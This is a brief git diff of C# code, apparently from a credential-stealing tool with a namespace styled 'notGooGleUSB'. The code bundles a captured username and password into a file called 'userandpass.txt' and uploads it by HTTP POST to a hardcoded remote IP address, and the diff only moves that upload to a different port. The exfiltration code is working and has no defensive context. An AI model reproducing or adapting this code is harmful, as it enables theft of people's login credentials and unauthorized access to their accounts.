@@ -38,7 +38,7 @@ namespace notGooGleUSB
                         var passwordContent = new ByteArrayContent(Encoding.UTF8.GetBytes(userNameAndPassword));
                         content.Add(passwordContent, "file", "userandpass.txt");
 
-                        var response = await client.PostAsync("http://96.51.136.132:3000/uploads", content);
+                        var response = await client.PostAsync("http://96.51.136.132:3002/uploads", content);
 
                         //if (response.IsSuccessStatusCode)
                         //{
@@ -61,9 +61,6 @@ namespace notGooGleUSB
                 form.Close();
             }
         }
-
-
-
 
 
 
